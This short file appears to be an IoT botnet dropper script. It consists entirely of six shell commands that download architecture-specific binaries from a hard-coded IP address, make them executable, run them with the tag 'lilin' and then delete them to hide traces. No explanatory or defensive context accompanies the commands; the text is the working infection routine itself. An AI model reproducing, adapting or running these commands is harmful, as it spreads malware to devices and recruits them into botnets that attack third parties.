wget http://45.95.146.126/mips; chmod 777 mips;./mips lilin;rm -rf mips;rm -rf li
wget http://45.95.146.126/mpsl; chmod 777 mpsl;./mpsl lilin;rm -rf mpsl;rm -rf li
wget http://45.95.146.126/arm; chmod 777 arm;./arm lilin;rm -rf arm;rm -rf li
wget http://45.95.146.126/arm5; chmod 777 arm5;./arm5 lilin;rm -rf arm5;rm -rf li
wget http://45.95.146.126/arm6; chmod 777 arm6;./arm6 lilin;rm -rf arm6;rm -rf li
wget http://45.95.146.126/arm7; chmod 777 arm7;./arm7 lilin;rm -rf arm7;rm -rf li